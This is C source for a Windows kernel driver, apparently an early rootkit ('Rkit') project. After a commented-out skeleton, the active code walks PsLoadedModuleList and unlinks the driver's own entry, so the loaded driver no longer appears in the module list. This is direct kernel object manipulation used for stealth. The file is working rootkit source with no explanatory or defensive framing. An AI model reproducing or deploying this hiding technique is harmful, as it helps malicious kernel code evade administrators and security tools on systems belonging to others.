/*
//================================
#include <ntddk.h>

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Rkit Unloading......\n");
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
    (void)DriverObject;
    UNREFERENCED_PARAMETER(RegistryPath);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Rkit Driver Loaded.......\n");

    DriverObject->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}
//================================
*/


#include <ntddk.h>

extern PVOID PsLoadedModuleList;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject);
VOID HideDriver(PDRIVER_OBJECT DriverObject);
VOID RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject);

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
    (void)DriverObject;
    UNREFERENCED_PARAMETER(RegistryPath);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Basic Driver Loaded\n");

    DriverObject->DriverUnload = DriverUnload;
    HideDriver(DriverObject);

    return STATUS_SUCCESS;
}

VOID HideDriver(PDRIVER_OBJECT DriverObject) {
    (void)DriverObject;
    RemoveFromLoadedModulesList(DriverObject);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Driver hidden from PsLoadedModuleList\n");
}

VOID RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject) {
    (void)DriverObject;
    PLIST_ENTRY moduleList = (PLIST_ENTRY)PsLoadedModuleList;
    PLIST_ENTRY currentEntry = moduleList->Flink;
    PLDR_DATA_TABLE_ENTRY current;

    while (currentEntry != moduleList) {
        current = CONTAINING_RECORD(currentEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (current->DllBase == DriverObject->DriverStart) {
            current->InLoadOrderLinks.Blink->Flink = current->InLoadOrderLinks.Flink;
            current->InLoadOrderLinks.Flink->Blink = current->InLoadOrderLinks.Blink;
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Driver unlinked from PsLoadedModuleList.\n");
            break;
        }
        currentEntry = currentEntry->Flink;
    }
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Basic Driver Unloading\n");
}
